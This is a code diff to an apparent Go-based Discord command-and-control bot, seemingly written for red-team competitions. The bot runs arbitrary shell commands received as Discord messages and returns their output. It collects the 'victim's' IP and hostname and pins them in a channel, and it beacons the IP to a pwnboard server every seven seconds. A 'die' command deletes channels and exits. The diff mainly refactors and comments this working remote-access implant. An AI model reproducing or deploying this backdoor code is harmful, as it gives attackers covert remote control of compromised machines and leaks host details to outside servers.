@@ -18,6 +18,8 @@ import (
 )
 
 var categoryid disgord.Snowflake
+var con = context.Background()
+var debug = true
 
 //Config is used to represent the config file
 type Config struct {
@@ -46,11 +48,14 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 
 	if !evt.Message.Author.Bot{
 		if msg.Content == "ping" {
-			s.SendMsg(context.Background(), msg.ChannelID, "I am alive. Thanks")	
+			s.SendMsg(con, msg.ChannelID, "I am alive. Thanks")	
 		}else if msg.Content == "die"{
 			// Delete Channel
-			s.DeleteChannel(context.Background(), msg.ChannelID)
-			s.DeleteChannel(context.Background(), categoryid) // <-------------------Remove after testing
+			s.DeleteChannel(con, msg.ChannelID)
+			s.DeleteChannel(con, categoryid)
+			// if debug{
+			// 	s.DeleteChannel(con, categoryid) // <-------------------Remove after testing
+			// }
 			os.Exit(0)
 		}else if msg.Content == "install" {
 			//Install stuff based on OS
@@ -60,9 +65,9 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 			//run os command and send results
 			output := shellRun(msg.Content)
 			if output == ""{
-				msg.Reply(context.Background(), s, "Command didn't return anything")
+				msg.Reply(con, s, "Command didn't return anything")
 			}else{
-				msg.Reply(context.Background(), s, prettyOutput(output))
+				msg.Reply(con, s, prettyOutput(output))
 			}
 		}
 	}else{
@@ -70,6 +75,7 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 	}
 }
 
+// shellRun
 //TODO: Large output
 func shellRun(cmd string) string{
 	// special cd
@@ -98,6 +104,9 @@ func shellRun(cmd string) string{
 	return string(out)
 }
 
+// updatepwnBoard sends a post request to pwnboard with the IP
+// Request is done every 7 seconds
+// ip: Victim's IP
 func updatepwnBoard(ip string){
 	for {
 
@@ -130,6 +139,7 @@ func updatepwnBoard(ip string){
 	}
 }
 
+// getIP gets the victim's IP
 func getIP() string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil {
@@ -146,19 +156,19 @@ func getIP() string {
 	return ""
 }
 
-func systeminfo(s disgord.Session, evt *disgord.MessageCreate){
-	//hostname and ip
-	ip := getIP()
-	
-	s.SendMsg(context.Background(), evt.Message.ChannelID, ip)
-	return
+// PrettyOutput beautifies output by putting ``` in first and back of the string
+// out: Output message
+func prettyOutput(out string) string {
+	return "```" + out + "```"
 }
 
-func prettyOutput(str string) string {
-	return "```" + str + "```"
-}
-
-
+// Entry Point
+// Reads the config file
+// Make a connection to the discord server
+// Create the OS type as category
+// Create teams under the category
+// Gets systeminfo and pins it
+// Also updates pwnboard every 7 seconds because why not
 func main(){
 	// Config file
 	f, err := os.Open("config.yaml")
@@ -176,7 +186,7 @@ func main(){
 
 	client := disgord.New(disgord.Config{
 		BotToken: config.Discord.Token,
-		Logger: disgord.DefaultLogger(false),
+		Logger: disgord.DefaultLogger(true),
 	})
 
 	id := config.Discord.ID
@@ -186,10 +196,16 @@ func main(){
 	// Pwnboard test
 	go updatepwnBoard(getIP())
 
-	defer client.StayConnectedUntilInterrupted(context.Background())
+	defer client.StayConnectedUntilInterrupted(con)
 
-	guild, err := client.GetGuild(context.Background(), disgord.Snowflake(id))
+	guild, err := client.GetGuild(con, disgord.Snowflake(id))
 	processError(err)
+	// fmt.Println("Guild Channel: ", guild.Channel)
+
+	// list of channels
+	channels := guild.Channels
+	fmt.Println(channels)
+
 
 	//create catogory
 	category := creator.CreateCategory(client, id, categoryName)
@@ -199,17 +215,16 @@ func main(){
 	// creator.CreateChannel(client, id,  category, "general")
 
 	//create channel
-	subchan := creator.CreateChannel(client, id,  category, channelName)
-	channels := &guild.Channels
-	fmt.Println(channels)
+	subchan := creator.CreateChannel(channels, client, id,  category, channelName)
+
 
 	// sending ip and pinning
-	ipmessage, _ := client.SendMsg(context.Background(), subchan.ID, prettyOutput("IP: " + getIP()))
-	client.PinMessage(context.Background(), ipmessage)
+	ipmessage, _ := client.SendMsg(con, subchan.ID, prettyOutput("IP: " + getIP()))
+	client.PinMessage(con, ipmessage)
 	//sending hostname and pinning
 	hostname , _ := os.Hostname()
-	hostnamemsg, _ := client.SendMsg(context.Background(), subchan.ID, prettyOutput("Hostname: " + hostname))
-	client.PinMessage(context.Background(), hostnamemsg)
+	hostnamemsg, _ := client.SendMsg(con, subchan.ID, prettyOutput("Hostname: " + hostname))
+	client.PinMessage(con, hostnamemsg)
 
 	client.On(disgord.EvtMessageCreate, userInput)
 }
